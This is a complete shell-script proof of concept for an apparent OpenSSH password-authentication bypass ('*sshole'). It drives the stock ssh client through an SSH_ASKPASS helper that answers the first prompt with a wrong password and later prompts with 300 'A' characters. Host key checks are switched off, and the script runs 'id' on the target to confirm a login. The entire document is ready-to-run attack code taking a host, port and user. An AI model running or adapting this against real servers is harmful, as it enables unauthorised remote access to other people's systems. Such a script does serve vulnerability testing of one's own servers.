#!/bin/sh
# *sshole PoC using only the stock OpenSSH client.
# usage: ./attack.sh HOST PORT USER
# One connection, two password prompts: "wrong", then 300 x 'A'. Prints `id` on success.
set -u
host=${1:?host} port=${2:?port} user=${3:?user}
state=$(mktemp -u)
helper=$(mktemp)
cat >"$helper" <<'EOF'
#!/bin/sh
# first prompt: a throwaway wrong password; every later prompt: 300 x 'A'
if [ -e "$ASKPASS_STATE" ]; then printf 'A%.0s' $(seq 300); echo; else : >"$ASKPASS_STATE"; echo wrong; fi
EOF
chmod +x "$helper"
export ASKPASS_STATE="$state" SSH_ASKPASS="$helper" SSH_ASKPASS_REQUIRE=force DISPLAY=:0
# setsid only matters for ssh < 8.4 (no SSH_ASKPASS_REQUIRE); macOS has none
${SETSID:-$(command -v setsid >/dev/null && echo "setsid -w")} ssh -F /dev/null -p "$port" \
  -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no \
  -o PreferredAuthentications=password -o PubkeyAuthentication=no \
  -o NumberOfPasswordPrompts=3 \
  "$user@$host" 'id' </dev/null
rc=$?
rm -f "$state" "$helper"
[ $rc -eq 0 ] && echo "RESULT: logged in as $user" || echo "RESULT: rejected (rc=$rc)"
exit $rc
